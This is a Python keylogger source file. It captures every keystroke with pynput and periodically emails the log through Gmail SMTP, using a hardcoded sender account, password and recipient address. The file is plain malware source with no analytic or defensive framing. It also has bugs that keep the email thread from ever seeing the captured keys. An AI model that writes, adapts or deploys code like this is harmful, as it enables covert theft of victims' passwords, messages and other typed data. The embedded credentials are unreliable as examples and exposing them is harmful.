import pynput.keyboard as k
import threading
import smtplib
import datetime
import ssl

class Keylogger:
    def __init__(self,interval):
        self.key_log = ''
        self.time_interval = interval

    def key_press(self, key):
        try: 
            curr_key = str(key.char)
        except AttributeError:
            if str(key) == 'Key.space':
                curr_key = ' '
            elif str(key) == 'Key.enter':
                curr_key = ' <Enter> '
            elif str(key) == 'Key.tab':
                curr_key = ' <Tab> '
            elif str(key) == 'Key.backspace':
                curr_key = ' <backspace> '
            elif str(key) == 'Key.shift':
                curr_key = ' <shift> '
            else:
                curr_key = ' ' + str(key) + ' '

        self.key_log += curr_key
    
    def start(self):
        listen_keyboard = k.Listener(on_press=self.key_press)
        with listen_keyboard:
            email = Send_Email(self.key_log,self.time_interval)
            email.start()
            listen_keyboard.join()

class Send_Email(threading.Thread):
    def __init__(self,key,interval):
        threading.Thread.__init__(self)
        self.event = threading.Event()
        self.key_log = key
        self.time_interval = interval
    
    def run(self):
         while not self.event.is_set():
            if len(self.key_log)>100:
                ts = datetime.datetime.now()
                SERVER = "smtp.gmail.com" #Specify Server Here
                PORT = 587 #Specify Port Here
                USER="keylogger6069@gmail.com" #Specify Username Here   
                PASS="mYpassWord.1"#Specify Password Here
                FROM = USER#From address is taken from username
                TO = ["bandedk@gmail.com"] #Specify to address.Use comma if more than one to address is needed.
                SUBJECT = "Keylogger data: "+ str(ts)
                MESSAGE = self.key_log
                message = """\
    From: %s
    To: %s
    Subject: %s


    %s
    """ % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
                try:
                    print (message)
                    context = ssl.create_default_context()
                    server = smtplib.SMTP(host='smtp.gmail.com',port=587, context=context)
                    server.starttls()
                    server.login(USER,PASS)
                    server.sendmail(FROM, TO, message)
                    self.key_log=''
                    server.quit()
                except Exception as e:
                    print (e)
            self.event.wait(self.time_interval)

   
klogger = Keylogger(5)
klogger.start()